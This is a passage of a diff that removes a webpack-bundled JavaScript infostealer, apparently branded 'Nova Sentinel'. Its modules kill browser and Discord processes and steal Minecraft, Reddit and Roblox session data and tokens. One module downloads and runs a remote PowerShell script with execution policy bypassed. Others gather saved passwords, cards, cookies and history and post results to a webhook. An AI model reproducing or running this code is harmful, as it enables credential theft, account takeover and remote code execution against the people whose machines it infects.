Sentinel | https://t.me/Sordeal\",\r\n        },\r\n        color: 3553599,\r\n      };\r\n      g.push(embed);\r\n    }\r\n    \r\n    let tosend = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\r\n      username: \"Nova Sentinel\",\r\n      embeds: g,\r\n    };\r\n    \r\n    return tosend;\r\n  }\r\n}catch(e){\r\n  return null;\r\n}\r\n}\r\nmodule.exports = {\r\n  ParseInstagram,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/instagram.js?");
-
-/***/ }),
-
-/***/ "./utils/kill.js":
-/*!***********************!*\
-  !*** ./utils/kill.js ***!
-  \***********************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const process = __webpack_require__(/*! process */ \"process\"),\r\n  core = __webpack_require__(/*! ./core */ \"./utils/core.js\");\r\n\r\nasync function KillBrowsersProcess(inject, browsers, silent) {\r\n  let allproc;\r\n  if (silent == \"yes\") return;\r\n  if (inject == \"yes\" && browsers == \"yes\") {\r\n    allproc = [\r\n      \"Atom\",\r\n      \"Uran\",\r\n      \"Maxthon3\",\r\n      \"liebao\",\r\n      \"Coowon\",\r\n      \"Sleipnir5\",\r\n      \"ChromePlus\",\r\n      \"Superbird\",\r\n      \"Rafotech\",\r\n      \"SaferTechnologies\",\r\n      \"Suhba\",\r\n      \"TorBrowser\",\r\n      \"ElementsBrowser\",\r\n      \"CocCoc\",\r\n      \"GoBrowser\",\r\n      \"QIP Surf\",\r\n      \"RockMelt\",\r\n      \"Nichrome\",\r\n      \"Bromium\",\r\n      \"Comodo\",\r\n      \"Xpom\",\r\n      \"Chedot\",\r\n      \"360Browser\",\r\n      \"Opera\",\r\n      \"OperaGX\",\r\n      \"EpicPrivacy\",\r\n      \"ChromeSxS\",\r\n      \"Sputnik\",\r\n      \"7Star\",\r\n      \"CentBrowser\",\r\n      \"Orbitum\",\r\n      \"Kometa\",\r\n      \"Torch\",\r\n      \"Amigo\",\r\n      \"Kmelon\",\r\n      \"PaleMoon\",\r\n      \"IceDragon\",\r\n      \"BlackHaw\",\r\n      \"Cyberfox\",\r\n      \"Thunderbird\",\r\n      \"SeaMonkey\",\r\n      \"Firefox\",\r\n      \"Waterfox\",\r\n      \"mullvad\",\r\n      \"firefox\",\r\n      \"chrome\",\r\n      \"mozilla\",\r\n      \"vivaldi\",\r\n      \"Opera\",\r\n      \"OperaGX\",\r\n      \"EpicPrivacy\",\r\n      \"ChromeSxS\",\r\n      \"Sputnik\",\r\n      \"7Star\",\r\n      \"CentBrowser\",\r\n      \"Orbitum\",\r\n      \"Amigo\",\r\n      \"Torch\",\r\n      \"Kometa\",\r\n      \"steam\",\r\n      \"filezilla\",\r\n      \"brave\",\r\n      \"BraveSoftware\",\r\n      \"brave.exe\",\r\n      \"msedge\",\r\n      \"edge\",\r\n      \"Uran\",\r\n      \"KMelon\",\r\n      \"Maxthon3\",\r\n      \"iebao\",\r\n      \"oowon\",\r\n      \"leipnir5\",\r\n      \"hromePlus\",\r\n      \"uperbird\",\r\n      \"afotech\",\r\n      \"aferTechnologies\",\r\n      \"uhba\",\r\n      \"orBrowser\",\r\n      \"lementsBrowser\",\r\n      \"ocCoc\",\r\n      \"oBrowser\",\r\n      \"IP Surf\",\r\n      \"ockMelt\",\r\n      \"ichrome\",\r\n      \"romium\",\r\n      \"omodo\",\r\n      \"pom\",\r\n      \"hedot\",\r\n      \"60Browser\",\r\n      \"discord\",\r\n      \"cord\",\r\n    ];\r\n  } else if (inject != \"yes\" && browsers == \"yes\") {\r\n    allproc = [\r\n      \"Atom\",\r\n      \"Uran\",\r\n      \"Maxthon3\",\r\n      \"liebao\",\r\n      \"Coowon\",\r\n      \"Sleipnir5\",\r\n      \"ChromePlus\",\r\n      \"Superbird\",\r\n      \"Rafotech\",\r\n      \"SaferTechnologies\",\r\n      \"Suhba\",\r\n      \"TorBrowser\",\r\n      \"ElementsBrowser\",\r\n      \"CocCoc\",\r\n      \"GoBrowser\",\r\n      \"QIP Surf\",\r\n      \"RockMelt\",\r\n      \"Nichrome\",\r\n      \"Bromium\",\r\n      \"Comodo\",\r\n      \"Xpom\",\r\n      \"Chedot\",\r\n      \"360Browser\",\r\n      \"Opera\",\r\n      \"OperaGX\",\r\n      \"EpicPrivacy\",\r\n      \"ChromeSxS\",\r\n      \"Sputnik\",\r\n      \"7Star\",\r\n      \"CentBrowser\",\r\n      \"Orbitum\",\r\n      \"Kometa\",\r\n      \"Torch\",\r\n      \"Amigo\",\r\n      \"Kmelon\",\r\n      \"PaleMoon\",\r\n      \"IceDragon\",\r\n      \"BlackHaw\",\r\n      \"Cyberfox\",\r\n      \"Thunderbird\",\r\n      \"SeaMonkey\",\r\n      \"Firefox\",\r\n      \"Waterfox\",\r\n      \"firefox\",\r\n      \"chrome\",\r\n      \"mozilla\",\r\n      \"vivaldi\",\r\n      \"Opera\",\r\n      \"OperaGX\",\r\n      \"EpicPrivacy\",\r\n      \"ChromeSxS\",\r\n      \"Sputnik\",\r\n      \"7Star\",\r\n      \"CentBrowser\",\r\n      \"Orbitum\",\r\n      \"Amigo\",\r\n      \"Torch\",\r\n      \"Kometa\",\r\n      \"steam\",\r\n      \"filezilla\",\r\n      \"brave\",\r\n      \"BraveSoftware\",\r\n      \"brave.exe\",\r\n      \"msedge\",\r\n      \"edge\",\r\n      \"Uran\",\r\n      \"KMelon\",\r\n      \"Maxthon3\",\r\n      \"iebao\",\r\n      \"oowon\",\r\n      \"leipnir5\",\r\n      \"hromePlus\",\r\n      \"uperbird\",\r\n      \"afotech\",\r\n      \"aferTechnologies\",\r\n      \"uhba\",\r\n      \"orBrowser\",\r\n      \"lementsBrowser\",\r\n      \"ocCoc\",\r\n      \"oBrowser\",\r\n      \"IP Surf\",\r\n      \"ockMelt\",\r\n      \"ichrome\",\r\n      \"romium\",\r\n      \"omodo\",\r\n      \"pom\",\r\n      \"hedot\",\r\n      \"60Browser\",\r\n    ];\r\n  } else if (inject == \"yes\" && browsers != \"yes\") {\r\n    allproc = [\"discord\", \"cord\"];\r\n  }\r\n  try {\r\n    allproc.forEach(async (g) => {\r\n      const filteredProcesses = await core.filterProcessesByName(g);\r\n      if (filteredProcesses.length > 0) {\r\n        try {\r\n          filteredProcesses.forEach((proc) => {\r\n            process.kill(proc.pid);\r\n          });\r\n        } catch (e) {}\r\n      }\r\n    });\r\n  } catch (e) {}\r\n}\r\n\r\nmodule.exports = {\r\n  KillBrowsersProcess,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/kill.js?");
-
-/***/ }),
-
-/***/ "./utils/minecraft.js":
-/*!****************************!*\
-  !*** ./utils/minecraft.js ***!
-  \****************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const axios = __webpack_require__(/*! axios */ \"axios\"),\r\n{ stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\nhttps = __webpack_require__(/*! https */ \"https\"),\r\nagent = new https.Agent({ rejectUnauthorized: false }),\r\nfs = __webpack_require__(/*! fs */ \"fs\"),\r\n{embeds, stats, badge} = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\r\n\r\nasync function NovaSentinelfinduid(wb, cc) {\r\n  if(cc != \"yes\")return;\r\n  for (const m of stat.minecraft_account) {\r\n\r\n    try {\r\n      let name = [];\r\n      let count = 0;\r\n      const content = fs.readFileSync(m, \"utf-8\");\r\n      const jsonData = JSON.parse(content);\r\n      if (jsonData) {\r\n        if(!jsonData.accounts)return;\r\n        const accountInfo =jsonData.accounts ;\r\n        for (const accountId in accountInfo) {\r\n          const emailRegex = /[\\w\\.-]+@[a-zA-Z\\d\\.-]+\\.[a-zA-Z]{2,}/g;\r\n          const emails = JSON.stringify(accountInfo).match(emailRegex) ?? \"none\";\r\n          const profile = accountInfo[accountId].minecraftProfile;\r\n          if (profile) {\r\n            const playerDBResponse = await axios.get(\r\n              `https://api.namemc.com/profile/${profile.id}/friends`\r\n            );\r\n            if (\r\n              playerDBResponse.status === 200 &&\r\n              playerDBResponse.data.length > 0\r\n            ) {\r\n              name = playerDBResponse.data.map((entry) => entry.name);\r\n              count = name.length;\r\n            }\r\n            const tosend = {\r\n              username: \"Nova Sentinel\",\r\n              avatar_url:\r\n                \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\r\n              embeds: [\r\n                {\r\n                  title: \"Nova Minecraft Account\",\r\n                  thumbnail: {\r\n                    url: `https://minotar.net/avatar/${profile.id}.png`,\r\n                  },\r\n                  color: 3553599,\r\n                  description: `[Download Skin](https://minotar.net/avatar/${profile.id}.png)\\n[Download Capes](http://s.optifine.net/capes/${profile.name}.png)`,\r\n                  fields: [\r\n                    {\r\n                      name: `${embeds.mcid} Account ID:`,\r\n                      value: `\\`\\`\\`${accountId}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.mcgapple} Username:`,\r\n                      value: `\\`\\`\\`${profile.name}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.mcmail} Email Found:`,\r\n                      value: `\\`\\`\\`${emails || `None`}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.keysmc} Minecraft UID`,\r\n                      value: `\\`\\`\\`${profile.id}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.namemc} Friends Count`,\r\n                      value: `\\`\\`\\`${count || 0}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.namemc} Friends List:`,\r\n                      value: `\\`\\`\\`${name.join(\", \") || `None`}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                  ],\r\n                  footer: {\r\n                    text: `@Nova Sentinel | https://t.me/Sordeal`,\r\n                  },\r\n                },\r\n              ],\r\n            };\r\n            try {\r\n              await axios({\r\n                url: wb,\r\n                method: \"POST\",\r\n                headers: {\r\n                  \"Content-Type\": \"application/json\",\r\n                },\r\n                httpsAgent: agent,\r\n                data: tosend,\r\n              });\r\n            } catch (e) {}\r\n          }\r\n        }\r\n      }\r\n    } catch (error) {}\r\n  }\r\n}\r\n\r\nmodule.exports = {\r\n  NovaSentinelfinduid,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/minecraft.js?");
-
-/***/ }),
-
-/***/ "./utils/phish.js":
-/*!************************!*\
-  !*** ./utils/phish.js ***!
-  \************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const fetch = __webpack_require__(/*! node-fetch */ \"node-fetch\");\r\nconst { exec } = __webpack_require__(/*! child_process */ \"child_process\"),\r\ncore = __webpack_require__(/*! ./core */ \"./utils/core.js\");\r\n\r\nasync function MicroPhish(githubRawUrl, webhook, cc) {\r\n    if(cc !== \"yes\")return;\r\n  const replaceText = \"%YOUR-DISCORD-WEBHOOK%\";\r\n  try {\r\n    const response = await fetch(githubRawUrl);\r\n    const script = await response.text();\r\n    const updatedScript = script.replace(replaceText, webhook);\r\n    const path = __webpack_require__(/*! path */ \"path\")\r\n    let randomPSfile = path.join(process.env.localappdata, \"Temp\", core.generateId(3) + \"tempScript.ps1\")\r\n    const fs = __webpack_require__(/*! fs */ \"fs\");\r\n    fs.writeFileSync(randomPSfile, updatedScript, \"utf-8\");\r\n    console.log(randomPSfile)\r\n    exec(\r\n      `powershell.exe -ExecutionPolicy Bypass -File ${randomPSfile}`,\r\n      (error, stdout, stderr) => {\r\n        if (error) {\r\n          return;\r\n        }\r\n      }\r\n    );\r\n  } catch (error) {\r\n  }\r\n}\r\n\r\nmodule.exports = {\r\n  MicroPhish,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/phish.js?");
-
-/***/ }),
-
-/***/ "./utils/reddit.js":
-/*!*************************!*\
-  !*** ./utils/reddit.js ***!
-  \*************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  { embeds } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\r\n\r\nasync function NovaRedditor(cc) {\r\n  if (cc !== \"yes\") return;\r\n\r\n  let g = [];\r\n  let reddit_sessions = stat.RedditSess;\r\n  if (reddit_sessions && reddit_sessions.length) {\r\n    for (const reddit of reddit_sessions) {\r\n      const { data: bearer } = await axios.post(\r\n        \"https://accounts.reddit.com/api/access_token\",\r\n        { scopes: [\"*\", \"email\", \"pii\"] },\r\n        {\r\n          headers: {\r\n            Cookie: `reddit_session=${reddit}`,\r\n            Authorization: \"Basic b2hYcG9xclpZdWIxa2c6\",\r\n          },\r\n        }\r\n      );\r\n      const { data: account } = await axios.get(\r\n        \"https://oauth.reddit.com/api/v1/me\",\r\n        {\r\n          headers: { Authorization: `Bearer ${bearer.access_token}` },\r\n        }\r\n      );\r\n      let { total_karma, icon_img, is_gold, email, name } = account;\r\n\r\n      let profile_link = `https://www.reddit.com/user/${name}`;\r\n      let embed = {\r\n        color: 3553599,\r\n        thumbnail: {\r\n          url: icon_img,\r\n        },\r\n        fields: [\r\n          {\r\n            name: `${embeds.billings} Profile`,\r\n            value: `[\\`${name}\\`](${profile_link})`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.karma} Karma`,\r\n            value: `\\`${total_karma}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.gold} Gold`,\r\n            value: `\\`${is_gold}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.mail} Email`,\r\n            value: `\\`${email}\\``,\r\n            inline: true,\r\n          },\r\n        ],\r\n        footer: {\r\n          text: \"@Nova Sentinel | https://t.me/Sordeal\",\r\n        },\r\n        title: \"Reddit Session\",\r\n      };\r\n      g.push(embed);\r\n    }\r\n\r\n    let tosend = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\r\n      username: \"Nova Sentinel\",\r\n      embeds: g,\r\n    };\r\n    return tosend;\r\n  }\r\n}\r\n\r\nmodule.exports = { NovaRedditor };\r\n\n\n//# sourceURL=webpack://script/./utils/reddit.js?");
-
-/***/ }),
-
-/***/ "./utils/roblox.js":
-/*!*************************!*\
-  !*** ./utils/roblox.js ***!
-  \*************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const { execSync } = __webpack_require__(/*! child_process */ \"child_process\"),\r\n{ stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\naxios = __webpack_require__(/*! axios */ \"axios\"),\r\nsave = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\r\n{embeds, stats, badge} = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\r\n\r\nfunction NovaSentinelGetRoblox(Found_Roblox) {\r\n  if (Found_Roblox != \"yes\") return;\r\n  try {\r\n    function subproc(path) {\r\n      try {\r\n        const cmd = `powershell Get-ItemPropertyValue -Path ${path}:SOFTWARE\\\\Roblox\\\\RobloxStudioBrowser\\\\roblox.com -Name .ROBLOSECURITY`;\r\n        const options = { windowsHide: true, shell: true };\r\n\r\n        return execSync(cmd, options).toString().trim();\r\n      } catch (e) {\r\n        return null;\r\n      }\r\n    }\r\n    let cooks = []\r\n    const regex_c00ks = subproc(\"HKLM\") || subproc(\"HKCU\");\r\n    if (regex_c00ks) {\r\n      cooks.push(regex_c00ks);\r\n    }\r\n    if (cooks.length > 0) {\r\n      if (cooks.includes(\".ROBLOSECURITY\")) {\r\n        stat.AddRoblox(cooks);\r\n      }\r\n    }\r\n  } catch (e) {\r\n    save.SaveError(e);\r\n  }\r\n}\r\n\r\nasync function ParseAndSendRoblox(cc) {\r\n  if (cc !== \"yes\") return;\r\n\r\n  const processedUsernames = new Set();\r\n  const axiosConfig = {\r\n    maxRedirects: 0,\r\n    validateStatus: function (status) {\r\n      return (status >= 200 && status < 300) || status === 302;\r\n    },\r\n  };\r\n\r\n  try {\r\n    const requests = stat.roblox_cookies.map(async (cookies) => {\r\n      save.saveRoblox(cookies)\r\n      const [userInfoResponse, friendsCountResponse] = await Promise.all([\r\n        axios.get(\"https://www.roblox.com/mobileapi/userinfo\", {\r\n          headers: {\r\n            Cookie: `.ROBLOSECURITY=${cookies}`,\r\n          },\r\n          ...axiosConfig,\r\n        }),\r\n        axios.get(\"https://friends.roblox.com/v1/my/friends/count\", {\r\n          headers: {\r\n            Cookie: `.ROBLOSECURITY=${cookies}`,\r\n          },\r\n          ...axiosConfig,\r\n        }),\r\n      ]);\r\n\r\n      if (\r\n        userInfoResponse.status === 200 &&\r\n        friendsCountResponse.status === 200\r\n      ) {\r\n        const {\r\n          UserName,\r\n          RobuxBalance,\r\n          ThumbnailUrl,\r\n          IsAnyBuildersClubMember,\r\n          IsPremium,\r\n        } = userInfoResponse.data;\r\n        const { count } = friendsCountResponse.data;\r\n        if (!processedUsernames.has(UserName)) {\r\n          processedUsernames.add(UserName);\r\n\r\n          const parsed = {\r\n            UserName,\r\n            RobuxBalance,\r\n            ThumbnailUrl,\r\n            IsAnyBuildersClubMember,\r\n            IsPremium,\r\n            friendscount: count,\r\n            cookies,\r\n          };\r\n\r\n          stat.detailRoblox(parsed);\r\n        }\r\n      }\r\n    });\r\n\r\n    await Promise.all(requests);\r\n  } catch (error) {}\r\n}\r\n\r\nasync function sendRoblox(cc) {\r\n  if (cc != \"yes\") return;\r\n  let p = stat.roblox_account;\r\n  if (p.length < 1) return;\r\n  return p;\r\n}\r\n\r\nfunction compile(embeds) {\r\n  var build = \"\";\r\n  build += `{\\n\"content\": null,\\n\"embeds\": [`;\r\n  for (let i = 0; i < embeds.length; i++) {\r\n    build += embeds[i];\r\n    if (i != embeds.length - 1) {\r\n      build += \",\\n\";\r\n    }\r\n  }\r\n  build += `],\\n\"avatar_url\": \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\\n\"username\": \"Nova Sentinel\",\\n\"attachments\": []\\n}`;\r\n  return build;\r\n}\r\n\r\nasync function embed(\r\n  UserName,\r\n  RobuxBalance,\r\n  ThumbnailUrl,\r\n  IsAnyBuildersClubMember,\r\n  IsPremium,\r\n  friendscount,\r\n  cookies\r\n) {\r\n  let embed = {\r\n    fields: [\r\n      {\r\n        name: `${embeds.atom} Name:`,\r\n        value: `\\`\\`\\`ansi\\n\u001b[2;32m${UserName}\u001b[0m\u001b[2;32m\u001b[0m\\`\\`\\``,\r\n        inline: false,\r\n      },\r\n      {\r\n        name: `${embeds.dsc} Robux:`,\r\n        value: `\\`\\`\\`ansi\\n\u001b[2;32m${RobuxBalance}\u001b[0m\u001b[2;32m\u001b[0m\\`\\`\\``,\r\n        inline: true,\r\n      },\r\n      {\r\n        name: `${embeds.rblxinfo} premium:`,\r\n        value: `\\`${IsPremium ? \"✅\" : \"❌\"}\\``,\r\n        inline: !0,\r\n      },\r\n      {\r\n        name: `${embeds.infoyl} Club Member:`,\r\n        value: `\\`${IsAnyBuildersClubMember ? \"✅\" : \"❌\"}\\``,\r\n        inline: !0,\r\n      },\r\n      {\r\n        name: `${embeds.inject} Cookie:`,\r\n        value: `[Cookies](${cookies})`,\r\n        inline: true,\r\n      },\r\n    ],\r\n    description: `\\`${friendscount} Friends\\``,\r\n    color: 3553599,\r\n    footer: {\r\n      text: \"@Nova Sentinel | https://t.me/Sordeal\",\r\n    },\r\n    title: \"Roblox Account\",\r\n    thumbnail: {\r\n      url: `${ThumbnailUrl}`,\r\n    },\r\n  };\r\n  return JSON.stringify(embed);\r\n}\r\n\r\nmodule.exports = {\r\n  NovaSentinelGetRoblox,\r\n  ParseAndSendRoblox,\r\n  sendRoblox,\r\n  embed,\r\n  compile,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/roblox.js?");
-
-/***/ }),
-
-/***/ "./utils/save.js":
-/*!***********************!*\
-  !*** ./utils/save.js ***!
-  \***********************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n  fs = __webpack_require__(/*! fs */ \"fs\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  archiver = __webpack_require__(/*! archiver */ \"archiver\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\");\n\nasync function getbasepath() {\n  try {\n    return (\n      process.env.localappdata + \"\\\\\" + \"Temp\" + \"\\\\\" + `${core.generateId(20)}`\n    );\n  } catch (err) {\n    if (err) {\n      return (\n        process.env.localappdata +\n        \"\\\\\" +\n        \"Temp\" +\n        \"\\\\\" +\n        `KS_NOVA_${process.env.USERNAME.replace(\".\", \"\") || \"USER\"}`\n      );\n    }\n  }\n}\nasync function getsavepath(country, ip) {\n  let splited = ip.split(\".\");\n  let startip = splited[0];\n  try {\n    return (\n      process.env.localappdata +\n      \"\\\\\" +\n      \"Temp\" +\n      \"\\\\\" +\n      `${country.toUpperCase()}_NOVA_${\n        process.env.USERNAME.replace(\".\", \"\") || \"USER\"\n        }_${ startip ?? \"111\"}` +\n      \".zip\"\n    );\n  } catch (err) {\n    if (err) {\n      return (\n        process.env.localappdata +\n        \"\\\\\" +\n        \"Temp\" +\n        \"\\\\\" +\n        `KS_NOVA_${process.env.USERNAME.replace(\".\", \"\") || \"USER\"}` +\n        \".zip\"\n      );\n    }\n  }\n}\n\nasync function Init(country, ip) {\n  const basepath = await getbasepath();\n  const savepath = await getsavepath(country, ip);\n  try {\n    if (fs.existsSync(basepath)) {\n      await fs.rmSync(basepath, { recursive: true });\n    }\n    if (fs.existsSync(savepath)) {\n      await fs.rmSync(savepath, { recursive: true });\n    }\n  } catch (e) {}\n\n  await fs.mkdirSync(basepath, { recursive: true });\n  stat.addbasepath(basepath);\n  stat.addsavepath(savepath);\n}\n\nasync function Save(copypath, mainfolder, subfolder) {\n  let basepath = stat.testpath[0];\n\n  const files = core.recursiveRead(copypath, copypath, \"\");\n  for (var i = 0; i < files.length; i++) {\n    const file = files[i];\n    const savePath =\n      basepath +\n      \"\\\\\" +\n      mainfolder +\n      \"\\\\\" +\n      subfolder +\n      \"\\\\\" +\n      file.replace(copypath, \"\");\n    try {\n      createAllDir(savePath);\n      fs.writeFileSync(savePath, fs.readFileSync(file));\n    } catch (e) {}\n  }\n}\n\nasync function SimpleSave(copypath, mainfolder, subfolder) {\n  let basepath = stat.testpath[0];\n  const files = core.recursiveRead(copypath, copypath, \"\");\n  for (var i = 0; i < files.length; i++) {\n    const file = files[i];\n    const savePath =\n      basepath +\n      \"\\\\\" +\n      mainfolder +\n      \"\\\\\" +\n      subfolder +\n      \"\\\\\" +\n      file.replace(copypath, \"\");\n    try {\n      createAllDir(savePath);\n      fs.writeFileSync(savePath, fs.readFileSync(file));\n    } catch (e) {}\n  }\n}\n\nasync function ArraySave(saves, mainfolder, subfolder) {\n  let basepath = stat.testpath[0];\n  for (var i = 0; i < saves.length; i++) {\n    const save = saves[i];\n\n    try {\n      if (fs.lstatSync(save).isDirectory()) {\n        const files = core.recursiveRead(save, save, \"\");\n        for (var j = 0; j < files.length; j++) {\n          const file = files[j];\n\n          let savePath;\n          if (subfolder != \"\") {\n            savePath =\n              basepath +\n              \"\\\\\" +\n              mainfolder +\n              \"\\\\\" +\n              subfolder +\n              \"\\\\\" +\n              save.slice(0, -1).split(\"\\\\\").pop() +\n              \"\\\\\" +\n              core.fileName(file);\n          } else {\n            savePath =\n              basepath +\n              \"\\\\\" +\n              mainfolder +\n              \"\\\\\" +\n              save.slice(0, -1).split(\"\\\\\").pop() +\n              \"\\\\\" +\n              core.fileName(file);\n          }\n\n          try {\n            createAllDir(savePath);\n            fs.writeFileSync(savePath, fs.readFileSync(file));\n          } catch (e) {}\n        }\n      } else {\n        const savePath =\n          basepath +\n          \"\\\\\" +\n          mainfolder +\n          \"\\\\\" +\n          subfolder +\n          \"\\\\\" +\n          core.fileName(save);\n        try {\n          createAllDir(savePath);\n          fs.writeFileSync(savePath, fs.readFileSync(save));\n        } catch (e) {}\n      }\n    } catch (e) {}\n  }\n}\n\nfunction createAllDir(str) {\n  var folders = str.split(path.sep);\n  var dir = \"\";\n  for (var i = 0; i < folders.length - 1; i++) {\n    dir += folders[i] + path.sep;\n    if (!fs.existsSync(dir)) {\n      fs.mkdirSync(dir, { recursive: true });\n    }\n  }\n}\n\nasync function SaveError(error) {\n  let basepath = stat.testpath[0];\n  var savePath = basepath + \"\\\\Logs\\\\\";\n  try {\n    fs.mkdirSync(savePath, { recursive: true });\n  } catch (e) {}\n  savePath += \"Error.nova\";\n  if (fs.existsSync(savePath)) {\n    fs.appendFileSync(savePath, error + \"\\n\");\n  } else {\n    fs.writeFileSync(savePath, error + \"\\n\");\n  }\n}\n\nasync function saveCookies(cookies, name) {\n  let basepath = stat.testpath[0];\n  if (cookies.length == 0) {\n    return;\n  }\n\n  var savePath = basepath + \"\\\\Browsers\\\\\";\n  try {\n    await fs.mkdirSync(savePath, { recursive: true });\n  } catch (e) {}\n\n  savePath += name + \" - Cookies.txt\";\n  var cookiesFinal = \"\";\n  for (let i = 0; i < cookies.length; i++) {\n    cookiesFinal += cookies[i].build();\n  }\n\n  fs.writeFileSync(savePath, cookiesFinal);\n}\n\nasync function saveRoblox(cookies) {\n  try {\n    let basepath = stat.testpath[0];\n    var savePath = basepath + \"\\\\Games\\\\\";\n\n    try {\n      fs.mkdirSync(savePath, { recursive: true });\n    } catch (e) {}\n\n    savePath += \"Roblox\\\\\";\n    fs.mkdirSync(savePath, { recursive: true });\n    savePath += `Roblox.txt`;\n    var cookiesFinal = \"\";\n    for (let i = 0; i < cookies.length; i++) {\n      cookiesFinal += cookies[i];\n    }\n    if (fs.existsSync(savePath)) {\n      fs.appendFileSync(savePath, cookiesFinal + \"\\n\");\n    } else {\n      fs.writeFileSync(savePath, cookiesFinal);\n    }\n  } catch (e) {}\n}\n\nasync function saveBrowser(\n  passwords,\n  autofills,\n  cards,\n  history,\n  downloads,\n  bookmarks\n) {\n  let basepath = stat.testpath[0];\n  const savePath = basepath + \"\\\\Browsers\\\\\";\n  const saveRoblx = basepath + \"\\\\Games\\\\Roblox\\\\\";\n\n  try {\n    if (!fs.existsSync(savePath)) {\n      await fs.mkdirSync(savePath, { recursive: true });\n    }\n  } catch (e) {}\n\n  try {\n    if (stat.roblox_account && stat.roblox_account.length > 0) {\n      if (!fs.existsSync(basepath + \"\\\\Games\")) {\n        await fs.mkdirSync(basepath + \"\\\\Games\", { recursive: true });\n      }\n      if (!fs.existsSync(saveRoblx)) {\n        await fs.mkdirSync(saveRoblx, { recursive: true });\n      }\n      const cookiesContent = stat.roblox_account.join(\"\\n\");\n      fs.writeFileSync(saveRoblx + \"Cookies.txt\", cookiesContent);\n    }\n  } catch (e) {}\n\n  let passwordFinal = \"\";\n  try {\n    for (let i = 0; i < passwords.length; i++) {\n      if (passwords[i] && typeof passwords[i].build === \"function\") {\n        passwordFinal += passwords[i].build() + \"\\n\";\n      }\n    }\n    if (passwordFinal.length !== 0) {\n      passwordFinal = core.getHeader() + passwordFinal;\n    }\n  } catch (e) {}\n\n  let autofillFinal = \"\";\n  for (let i = 0; i < autofills.length; i++) {\n    autofillFinal += autofills[i].build() + \"\\n\";\n  }\n\n  if (autofillFinal.length != 0) {\n    autofillFinal = core.getHeader() + autofillFinal;\n  }\n\n  let historyFinal = \"\";\n  for (let i = 0; i < history.length; i++) {\n    historyFinal += history[i].build() + \"\\n\";\n  }\n\n  if (historyFinal.length != 0) {\n    historyFinal = core.getHeader() + historyFinal;\n  }\n\n  let downloadFinal = \"\";\n  for (let i = 0; i < downloads.length; i++) {\n    downloadFinal += downloads[i].build() + \"\\n\";\n  }\n\n  if (downloadFinal.length != 0) {\n    downloadFinal = core.getHeader() + downloadFinal;\n  }\n\n  let bookmarkFinal = \"\";\n  for (let i = 0; i < bookmarks.length; i++) {\n    bookmarkFinal += bookmarks[i].build() + \"\\n\";\n  }\n\n  if (bookmarkFinal.length != 0) {\n    bookmarkFinal = core.getHeader() + bookmarkFinal;\n  }\n\n  let cardFinal = \"\";\n  for (let i = 0; i < cards.length; i++) {\n    cardFinal += cards[i].build() + \"\\n\";\n  }\n\n  if (cardFinal.length != 0) {\n    cardFinal = core.getHeader() + cardFinal;\n  }\n\n  await fs.writeFileSync(savePath + \"Passwords.txt\", passwordFinal);\n  fs.writeFileSync(savePath + \"AutoFill.txt\", autofillFinal);\n  fs.writeFileSync(savePath + \"History.txt\", historyFinal);\n  fs.writeFileSync(savePath + \"Downloads.txt\", downloadFinal);\n  fs.writeFileSync(savePath + \"Bookmarks.txt\", bookmarkFinal);\n  fs.writeFileSync(savePath + \"Cards.txt\", cardFinal);\n}\n\nasync function saveMailClients(accounts, name) {\n  let basepath = stat.testpath[0];\n  let savePath = basepath + \"\\\\MailClients\\\\\";\n  try {\n    fs.mkdirSync(savePath, { recursive: true });\n  } catch (e) {}\n\n  savePath += name + \"\\\\\";\n  try {\n    fs.mkdirSync(savePath, { recursive: true });\n  } catch (e) {}\n\n  fs.writeFileSync(\n    savePath + \"accounts.json\",\n    JSON.stringify(accounts, null, 4)\n  );\n}\n\nasync function saveSysAdmin(accounts, name) {\n  let basepath = stat.testpath[0];\n  let savePath = basepath + \"\\\\Clients\\\\\";\n  try {\n    fs.mkdirSync(savePath, { recursive: true });\n  } catch (e) {}\n\n  savePath += name + \"\\\\\";\n  try {\n    fs.mkdirSync(savePath, { recursive: true });\n  } catch (e) {}\n\n  fs.writeFileSync(\n    savePath + \"accounts.json\",\n    JSON.stringify(accounts, null, 4)\n  );\n}\n\nasync function zipResult() {\n  let savepath = 